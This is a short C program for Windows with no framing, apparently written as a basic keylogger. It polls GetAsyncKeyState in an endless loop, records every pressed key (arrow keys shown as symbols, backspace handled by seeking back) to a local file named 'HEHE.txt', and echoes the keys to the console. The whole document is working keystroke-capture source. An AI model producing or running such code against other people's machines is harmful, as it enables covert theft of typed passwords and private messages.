#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

int main (){
	int result,teclas=0;
	FILE *arq;
	
	
	arq = fopen("HEHE.txt","w");

	while(1) {
    for(teclas = 0; teclas <= 127; teclas++) {
        
        result = GetAsyncKeyState(teclas);

        if(result == -32767) {
            if (teclas == 8 ){
				fseek(arq, -1, SEEK_CUR);	
			}else if (teclas == 37){
				fprintf(arq,"<");
				printf("<");
			}else if (teclas == 38){
				fprintf(arq,"/\\");
				printf("/\\");
			}else if (teclas == 39){
				fprintf(arq,">");
				printf(">");
			}else if (teclas == 40){
				fprintf(arq,"\\/");
				printf("\\/");
			}else{
				fprintf(arq,"%c", teclas);
				printf("%c",teclas);
			}
			
			
        }
    }
}



fclose(arq);
	return 0;
}
